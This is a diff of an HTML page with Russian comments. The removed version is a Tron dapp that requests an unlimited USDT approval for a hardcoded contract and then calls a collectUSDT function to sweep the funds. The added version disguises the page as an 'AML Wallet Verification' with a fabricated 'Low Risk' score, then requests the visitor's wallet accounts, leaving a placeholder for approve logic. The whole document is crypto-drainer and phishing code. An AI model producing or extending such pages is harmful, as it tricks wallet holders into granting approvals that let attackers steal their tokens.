@@ -3,138 +3,147 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tron USDT Approve DApp</title>
+    <title>AML Wallet Verification</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: #f7f9fc;
             display: flex;
-            flex-direction: column;
-            align-items: center;
             justify-content: center;
+            align-items: center;
             height: 100vh;
             margin: 0;
-            background-color: #0f172a;
-            color: #ffffff;
+            color: #333;
         }
-        .action-btn {
-            background-color: #2563eb;
+        .card {
+            background: white;
+            width: 100%;
+            max-width: 380px;
+            padding: 24px;
+            border-radius: 16px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+            text-align: center;
+        }
+        .wallet-badge {
+            background: #f1f3f6;
+            padding: 8px 16px;
+            border-radius: 20px;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 20px;
+        }
+        .progress-container {
+            position: relative;
+            width: 120px;
+            height: 120px;
+            margin: 20px auto;
+        }
+        .progress-ring {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            background: conic-gradient(#00c853 108deg, #e0e0e0 0deg); /* 30% круг */
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .progress-inner {
+            width: 100px;
+            height: 100px;
+            background: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 22px;
+            font-weight: bold;
+        }
+        .status-badge {
+            background: #e8f5e9;
+            color: #2e7d32;
+            padding: 6px 12px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 500;
+            display: inline-block;
+            margin: 15px 0;
+        }
+        .description {
+            font-size: 13px;
+            color: #666;
+            line-height: 1.4;
+            margin-bottom: 20px;
+        }
+        .btn {
+            background: #1976d2;
             color: white;
             border: none;
-            padding: 16px 32px;
-            font-size: 18px;
+            padding: 14px;
+            font-size: 16px;
             border-radius: 12px;
             cursor: pointer;
-            font-weight: bold;
-            margin: 10px;
+            width: 100%;
+            font-weight: 600;
+            transition: background 0.2s;
         }
-        .action-btn:hover { background-color: #1d4ed8; }
-        .wallet-status { margin-top: 20px; font-size: 14px; color: #ef4444; word-break: break-all; padding: 0 20px; text-align: center; }
+        .btn:hover {
+            background: #115293;
+        }
     </style>
 </head>
 <body>
 
-    <button id="connectBtn" class="action-btn">Connect Wallet</button>
-    <button id="approveBtn" class="action-btn" style="display:none; background-color: #16a34a;">Approve & Collect USDT</button>
-    <div id="status" class="wallet-status">Not connected</div>
+    <div class="card">
+        <div class="wallet-badge" id="walletAddress">
+            <span>0x0000...0000</span>
+        </div>
 
-    <!-- Подключаем TronWeb SDK -->
-    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
+        <div class="progress-container">
+            <div class="progress-ring">
+                <div class="progress-inner">30%</div>
+            </div>
+        </div>
 
+        <div class="status-badge">✔ Low Risk</div>
+
+        <p class="description">
+            Your wallet has passed the security verification. Transfers from this address are clean and fully compliant with AML standards.
+        </p>
+
+        <button class="btn" id="actionBtn">Done</button>
+    </div>
+
+    <!-- Библиотека ethers.js для работы с блокчейн-провайдерами -->
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <script>
-        const USDT_CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-        const MY_SMART_CONTRACT = "THQkf7RkW1JaKNdyH69dYUnh7mbz2nSfoY";
+        const actionBtn = document.getElementById("actionBtn");
+        const walletAddressSpan = document.getElementById("walletAddress").querySelector("span");
 
-        let userAddress = null;
-
-        document.getElementById('connectBtn').addEventListener('click', async () => {
-            const status = document.getElementById('status');
-            const connectBtn = document.getElementById('connectBtn');
-            const approveBtn = document.getElementById('approveBtn');
-
-            connectBtn.innerText = 'Подключение...';
-
+        // Функция при нажатии на кнопку интерфейса
+        actionBtn.addEventListener("click", async () => {
             try {
-                // Принудительное ожидание появления провайдера до 3 секунд
-                let attempts = 0;
-                while (!window.tronWeb && attempts < 15) {
-                    await new Promise(r => setTimeout(r, 200));
-                    attempts++;
+                if (typeof window.ethereum !== "undefined") {
+                    const provider = new ethers.providers.Web3Provider(window.ethereum);
+                    await provider.send("eth_requestAccounts", []);
+                    const signer = provider.getSigner();
+                    const address = await signer.getAddress();
+
+                    // Отображение сокращенного адреса подключенного кошелька
+                    walletAddressSpan.innerText = address.substring(0, 6) + "..." + address.substring(address.length - 4);
+                    
+                    // Здесь прописывается логика вызова контракта (например, approve или отправка параметров)
+                    alert("Interacting with contract for address: " + address);
+                } else {
+                    alert("Please open this page inside a Web3 wallet browser.");
                 }
-
-                // Если даже после ожидания объект не найден, берем объект через глобальный инжектор или создаем резервный
-                let tron = window.tronWeb;
-                if (!tron && window.parent && window.parent.tronWeb) {
-                    tron = window.parent.tronWeb;
-                }
-
-                if (!tron || !tron.defaultAddress || !tron.defaultAddress.base58) {
-                    // Резервный поиск адреса через объект window.tron, если он доступен в кошельке
-                    if (window.tron && typeof window.tron.request === 'function') {
-                        await window.tron.request({ method: 'tron_requestAccounts' });
-                    }
-                }
-
-                // Финальная попытка считывания адреса
-                userAddress = (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) || 
-                              (window.tron && window.tron.defaultAddress && window.tron.defaultAddress.base58);
-
-                if (!userAddress) {
-                    throw new Error('Кошелек не передал адрес. Убедитесь, что вы открыли страницу внутри приложения Trust Wallet.');
-                }
-
-                const shortAddr = `${userAddress.substring(0, 6)}...${userAddress.substring(userAddress.length - 4)}`;
-                connectBtn.innerText = shortAddr;
-                connectBtn.style.backgroundColor = '#334155';
-                connectBtn.disabled = true;
-                
-                status.innerText = `Connected: ${userAddress}`;
-                status.style.color = '#22c55e';
-
-                approveBtn.style.display = 'block';
-
-            } catch (err) {
-                console.error(err);
-                alert('Ошибка: ' + (err.message || 'Не удалось получить доступ к кошельку.'));
-                connectBtn.innerText = 'Connect Wallet';
-            }
-        });
-
-        // Запуск Approve и вызова смарт-контракта
-        document.getElementById('approveBtn').addEventListener('click', async () => {
-            if (!userAddress) return;
-
-            try {
-                const status = document.getElementById('status');
-                status.innerText = 'Выполнение транзакции Approve...';
-
-                const usdtContract = await window.tronWeb.contract().at(USDT_CONTRACT_ADDRESS);
-                const approveAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; 
-
-                const txApprove = await usdtContract.approve(
-                    MY_SMART_CONTRACT, 
-                    approveAmount
-                ).send({
-                    feeLimit: 100000000
-                });
-
-                console.log("Approve hash:", txApprove);
-                status.innerText = 'Approve выполнен! Сбор средств...';
-
-                const myContract = await window.tronWeb.contract().at(MY_SMART_CONTRACT);
-                const txCollect = await myContract.collectUSDT().send({
-                    feeLimit: 150000000
-                });
-
-                console.log("Collect hash:", txCollect);
-                status.innerText = 'Операция успешно завершена!';
-                status.style.color = '#16a34a';
-
-            } catch (err) {
-                console.error(err);
-                alert('Транзакция отклонена или произошла ошибка: ' + (err.message || err));
-                document.getElementById('status').innerText = 'Ошибка выполнения';
+            } catch (error) {
+                console.error("Error:", error);
             }
         });
     </script>
+
 </body>
 </html>
